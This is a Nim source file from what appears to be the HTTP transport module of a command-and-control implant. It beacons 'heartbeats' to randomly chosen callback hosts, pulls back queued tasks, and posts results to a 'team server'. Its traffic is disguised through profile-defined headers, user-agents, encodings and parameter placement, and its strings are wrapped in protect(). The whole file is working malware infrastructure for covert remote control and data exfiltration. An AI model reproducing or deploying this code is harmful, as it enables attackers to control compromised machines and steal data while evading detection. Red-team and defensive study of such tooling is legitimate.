import httpclient, json, strformat, strutils, asyncdispatch, base64, tables, parsetoml, random
import ./io
import ../../common/[types, utils, profile]

proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string = 

    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("agent.user-agent")))
    var heartbeatString: string

    # Apply data transformation to the heartbeat bytes
    case ctx.profile.getString(protect("http-get.agent.heartbeat.encoding.type"), default = "none")
    of "base64":
        heartbeatString = encode(heartbeat, safe = ctx.profile.getBool(protect("http-get.agent.heartbeat.encoding.url-safe"))).replace("=", "")
    of "none": 
        heartbeatString = Bytes.toString(heartbeat)

    # Define request headers, as defined in profile
    for header, value in ctx.profile.getTable(protect("http-get.agent.headers")): 
        client.headers.add(header, value.getStringValue())

    # Select a random endpoint to make the request to
    var endpoint = ctx.profile.getString(protect("http-get.endpoints"))
    if endpoint[0] == '/': 
        endpoint = endpoint[1..^1] & "?"    # Add '?' for additional GET parameters

    let 
        prefix = ctx.profile.getString(protect("http-get.agent.heartbeat.prefix"))
        suffix = ctx.profile.getString(protect("http-get.agent.heartbeat.suffix"))
        payload = prefix & heartbeatString & suffix

    # Add heartbeat packet to the request
    case ctx.profile.getString(protect("http-get.agent.heartbeat.placement.type")): 
    of "header": 
        client.headers.add(ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name")), payload)
    of "parameter":
        let param = ctx.profile.getString(protect("http-get.agent.heartbeat.placement.name"))
        endpoint &= fmt"{param}={payload}&"
    of "uri":
        discard
    of "body": 
        discard
    else:
        discard 

    # Define additional request parameters
    for param, value in ctx.profile.getTable(protect("http-get.agent.parameters")): 
        endpoint &= fmt"{param}={value.getStringValue()}&"

    try:
        # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
        # Select random callback host
        let hosts = ctx.hosts.split(";")
        let host = hosts[rand(hosts.len() - 1)]
        let responseBody = waitFor client.getContent(fmt"http://{host}/{endpoint[0..^2]}")
    
        # Return if no tasks are queued
        if responseBody.len <= 0: 
            return ""

        # In case that tasks are found, apply data transformation to server's response body to get thr raw data
        let 
            prefix = ctx.profile.getString(protect("http-get.server.output.prefix"))
            suffix = ctx.profile.getString(protect("http-get.server.output.suffix"))
            encResponse = responseBody[len(prefix) ..^ len(suffix) + 1]

        case ctx.profile.getString(protect("http-get.server.output.encoding.type"), default = "none"): 
        of "base64":
            return decode(encResponse) 
        of "none":
            return encResponse 

    except CatchableError as err:
        # When the listener is not reachable, don't kill the application, but check in at the next time
        echo "[-] ", err.msg 
    
    finally:
        client.close()

    return ""

proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
    
    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("agent.user-agent")))

    # Define request headers, as defined in profile
    for header, value in ctx.profile.getTable(protect("http-post.agent.headers")): 
        client.headers.add(header, value.getStringValue())
    
    # Select a random endpoint to make the request to
    var endpoint = ctx.profile.getString(protect("http-post.endpoints"))
    if endpoint[0] == '/': 
        endpoint = endpoint[1..^1]
    
    let requestMethod = parseEnum[HttpMethod](ctx.profile.getString(protect("http-post.request-methods"), protect("POST")))

    let body = Bytes.toString(data)

    try:
        # Send post request to team server
        # Select random callback host
        let hosts = ctx.hosts.split(";")
        let host = hosts[rand(hosts.len() - 1)]
        discard waitFor client.request(fmt"http://{host}/{endpoint}", requestMethod, body)
    
    except CatchableError as err:
        print "[-] ", err.msg 
        return false
    
    finally:
        client.close()

    return true